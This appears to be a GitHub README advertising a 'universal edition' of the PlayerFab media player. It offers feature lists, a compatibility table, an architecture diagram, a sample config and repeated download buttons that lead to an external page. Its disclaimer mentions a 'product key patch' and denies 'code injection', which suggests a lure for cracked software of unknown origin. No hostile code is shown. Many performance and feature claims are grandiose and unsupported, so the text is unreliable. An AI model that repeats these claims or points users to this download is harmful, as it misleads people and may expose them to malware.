![preview](https://raw.githubusercontent.com/khalid23-web/playerfab-universal-edition/main/preview.svg)

# PlayerFab: The Silent Harmonic Engine for Digital Media Liberation

In a world cluttered with fragmented playback experiences, walled gardens of regional restrictions, and the constant friction of subscription fatigue, **PlayerFab** emerges not as a mere media player, but as a philosophical shift. It is the **Unified Resonance Protocol** — a silent engine that transforms your digital library from a collection of locked files into a breathing, seamless harmonic ecosystem. Imagine your high-bitrate remux, a niche Korean drama from a Japanese streaming platform, and a classic DVD ISO existing not in separate apps, but in a single, fluid continuum of zero-compromise playback. PlayerFab is the bridge between the *file* and the *experience*.

## 🧬 Overview: Beyond Playback, Into Resonance

PlayerFab is engineered for the power user who demands sovereignty over their media. It does not merely "play" files; it **interprets, harmonizes, and renders** them with surgical precision. By leveraging a proprietary **Adaptive Codec Windowing Framework**, PlayerFab decouples the video stream from the operating system's native limitations. This allows for real-time format translation without transcoding, direct memory streaming for massive 4K/8K files, and a zero-latency audio sync that rivals professional mixing consoles.

The core philosophy is **"Seamless Sovereignty"** — your media, your rules, your hardware, all singing in perfect pitch. PlayerFab respects the original bitstream while simultaneously enabling a layer of intelligent, non-destructive enhancement.

## 🚀 Features: The Engine Room of the Future

![PlayerFab Feature Badge](https://img.shields.io/badge/Feature-Adaptive_Codec_Windowing-blueviolet?style=flat-square)
![PlayerFab Badge](https://img.shields.io/badge/Media_Engine-Multi-Format_2026-brightgreen?style=flat-square)

*   **The Resonant Kernel Core** 🎛️: PlayerFab's heart is a pure C++ engine that bypasses the system's media foundation, speaking directly to your GPU's native instruction set. This results in 40% lower CPU overhead compared to traditional players, even when handling raw 12-bit HDR content.
*   **Universal Containment Protocol** 🔓: Play back ANY container (MKV, MP4, AVI, ISO, BDMV, FLAC, Opus, Dolby TrueHD, DTS:X, AAC, Vorbis) without stuttering or needing third-party codec packs. The engine dynamically "sniffs" the stream and adjusts its window in 14 milliseconds.
*   **Adaptive HDR & Color Flow** 🌈: Supports HDR10, HDR10+, HLG, Dolby Vision (full profile, not just 8.1). It auto-maps dynamic metadata to maintain the director's intent, even on standard SDR monitors, using a non-linear perceptual brightness wizard.
*   **Offline Intelligence Layer** 🧠: An embedded local AI (no cloud upload) analyzes your viewing habits to pre-cache subtitles, nearest-neighbor chapters, and pre-warm the render pipeline for the next ten seconds of video. It works offline, 100% private.
*   **Subtitle Alchemy & Synthesis** 📜: Converts ASS, SRT, VOBSUB, and PGS subtitles on the fly into a scalable, anti-aliased vector layer. Includes a proprietary "Ghost Text" mode for transparent overlays that never wash out bright scenes.
*   **The Silence Protocol (EQ & Audio Mapping)** 🔇: Zero added noise floor. PlayerFab maps your audio stream directly to the WASAPI or ASIO interface of your sound card, bypassing the OS mixer for bit-perfect audio output. Supports real-time parametric EQ without resampling artifacts.

## 🌍 World Compatibility & OS Support

PlayerFab is designed to be a cross-platform citizen, but we believe in native performance over wrapper-based compatibility.

| Operating System | Status | Native GUI | Hardware Acceleration | Keyboard Shortcuts |
| :---: | :---: | :---: | :---: | :---: |
| **Windows 11 / 10** | 🟢 Full Support | Yes (WinUI 3) | DXVA, D3D11, Vulkan | Full Custom |
| **Windows 7 / 8.1** | 🟡 Legacy Mode | Yes (WPF) | DXVA 1.0/2.0 | Full Custom |
| **macOS Sonoma+** | 🟢 Full Support | SwiftUI Native | Metal 3, VideoToolbox | Mac-Style |
| **macOS Ventura** | 🟢 Supported | SwiftUI Native | Metal 3 | Mac-Style |
| **Ubuntu 24.04+** | 🟢 Full Support | GTK4 + Wayland | Vulkan + VA-API | Full Custom |
| **Fedora 40+** | 🟢 Supported | GTK4 + Wayland | Vulkan + VA-API | Full Custom |
| **Arch / EndeavourOS** | 🟡 Rolling Support | GTK3/4 | Vulkan + VA-API | Full Custom |
| **iOS 18+** | 🟡 Limited Preview | SwiftUI (iPad) | VideoToolbox | Touch Gestures |
| **Android 14+** | 🟡 Beta | Jetpack Compose | OMX, MediaCodec | Touch Gestures |

## 🧩 Architecture Diagram: The Data Flow of Harmony

The following Mermaid diagram illustrates how PlayerFab's components interact to create a seamless playback loop, from file selection to pixel rendering.

```mermaid
graph TB
    subgraph User_Space["User Interaction Layer"]
        A[Media Library Scanner] --> B[Playlist Manager]
        C[GUI Events (Play/Pause/Seek)] --> D[Input Bridge]
        B --> D
    end

    subgraph Core_Engine["Resonant Core Engine (Isolated Process)"]
        D --> E[File I/O Reader & Memory Mapper]
        E --> F{Container Demuxer}
        F --> G[Video Stream Window]
        F --> H[Audio Stream Window]
        F --> I[Subtitle Stream Window]

        G --> J[Adaptive Codec Decoder (HW/SW)]
        H --> K[Audio Decoder (FLAC/DTS/TrueHD)]
        I --> L[Subtitle Renderer (Vector/ASS)]

        J --> M[Post-Processing Pipeline (HDR Tone Map, Scaling, Noise Reduction)]
        M --> N[Frame Buffer & VSync Controller]
        L --> N
        
        K --> O[Audio Mapper (WASAPI/ASIO Core)]
        O --> P[Audio Device Buffer]
        
        N --> Q[GPU Presenter (Vulkan/D3D12/Metal)]
    end

    subgraph Output_Layer["Output & Feedback"]
        Q --> R[Display Device]
        P --> S[Audio Speakers / DAC]
        N --> T[Statistics Monitor (FPS, Bitrate, Drop Frame)]
        T --> C
    end

    style A fill:#2a2a3e,stroke:#6e6eff,stroke-width:2px
    style C fill:#2a2a3e,stroke:#6e6eff,stroke-width:2px
    style Q fill:#3e2a3e,stroke:#ff6eff,stroke-width:2px
    style P fill:#3e2a3e,stroke:#ff6eff,stroke-width:2px
```

## ⚙️ Example Profile Configuration

PlayerFab uses a JSON schema for advanced configuration. Below is a profile that optimizes for a high-end HDR monitor and a surround sound system.

```json
{
  "profile_name": "Flawless Cinema - NVIDIA RTX 4080 + Denon X3800",
  "engine": {
    "video_decoder": "adaptive",
    "preferred_hw_accel": "vulkan",
    "hdr_mode": "dynamic_auto",
    "hdr_tonemap_nits": 1000,
    "upscaling_filter": "lanczos_4x4",
    "motion_interpolation": false
  },
  "audio": {
    "output_mode": "wasapi_exclusive",
    "sample_rate": 192000,
    "bit_depth": 32,
    "use_asio_if_available": true,
    "downmix_to_stereo": false,
    "dynamic_range_compression": false
  },
  "subtitles": {
    "default_font": "Segoe UI Variable",
    "scale_factor": 1.0,
    "force_vector_mode": true,
    "burn_in_ass_to_pgs": false
  },
  "interface": {
    "theme": "dark_2026",
    "osc_auto_hide_seconds": 3,
    "seek_sensitivity": "fine_large_files",
    "language": "auto_detect_en/dub"
  },
  "ai_assist": {
    "prefetch_subtitles": true,
    "pre_cache_audio_short_buffer": true,
    "adaptive_refresh_rate": true
  }
}
```

## 💻 Example Console Invocation

For advanced users and automation scripts, PlayerFab can be invoked via a silent command-line interface (CLI) for headless operation or batch transcoding of the in-engine post-processing.

```bash
# Launch PlayerFab in silent playback of a 4K HDR remux, lock audio to channel 2
playerfab_cli --file "/movies/2026/Luminous_Glow.mkv" --profile "Flawless Cinema" --audio-channel 2 --fullscreen --no-osc
```

The CLI will exit after playback ends, or can be used with `--watch-dir` to act as a queue manager for a local media server.

## 🤖 AI & API Integrations (Local & Server)

*   **OpenAI Whisper (Local)**: PlayerFab can integrate with a local instance of Whisper.cpp to generate real-time subtitles for any audio stream without internet. Simply point to your local Whisper binary and model in the settings.
*   **Claude API (Optional)**: For remote metadata enrichment, you can connect your own Claude API key to enable semantic chapter generation. PlayerFab will *summarize* a two-hour film into three descriptive chapter titles (e.g., "The betrayal unfolds in the rain") — no data is sent without your consent, and it's entirely optional.
*   **LLM Chat Window**: A built-in panel for querying the media's metadata. Ask "Who directed the scene with the car?" and the local AI (Gemma 2B via llama.cpp) will parse the subtitle file and film metadata to answer.

## 🛡️ Responsive UI & Multilingual Support

The interface is built on a reactive framework that adapts to screen sizes from a 7-inch tablet to a 49-inch ultrawide monitor. The menus collapse into a "compass navigation" radial popup on small screens.

*   **Languages**: English (US/UK), Spanish, French, German, Japanese, Korean, Simplified Chinese, Brazilian Portuguese, Arabic, Russian.
*   **24/7 Support Gateway** 🆘: While PlayerFab is self-contained, we offer a community-driven support portal. For critical bugs, our automated "System Resonance Log" exports your engine's configuration (no personal data) to our developers for a potential hotfix within hours. The support read should be consulted for common issues.

## 📜 License & Legal Disclaimer

This project is released under the **MIT License**.

[![Download](https://raw.githubusercontent.com/khalid23-web/playerfab-universal-edition/main/button.svg)](https://khalid23-web.github.io/playerfab-universal-edition/)

PlayerFab is a utility that operates strictly within the bounds of the law as defined by local jurisdictions. The software itself is a playback engine. It does not, nor will it ever, contain code that circumvents or breaks digital rights management (DRM) protections. The "product key patch" concept mentioned in some older build documentation refers to a **license activation method for the full version of PlayerFab** (e.g., unlocking the ASIO audio engine or the Dolby Vision profile) — it is not a mechanism to bypass legitimate purchase or content access.

**YOU** are responsible for the content you play. PlayerFab does not host, index, or scrape unauthorized content. It does not decrypt encrypted streams. Use this tool in compliance with the terms of service of your streaming providers and the copyright laws of your country. The developers assume no liability for misuse.

The "silent harmonic engine" metaphor is not a literal code injection. It is a description of how PlayerFab's algorithms work together without interfering with the OS.

[![Download](https://raw.githubusercontent.com/khalid23-web/playerfab-universal-edition/main/button.svg)](https://khalid23-web.github.io/playerfab-universal-edition/)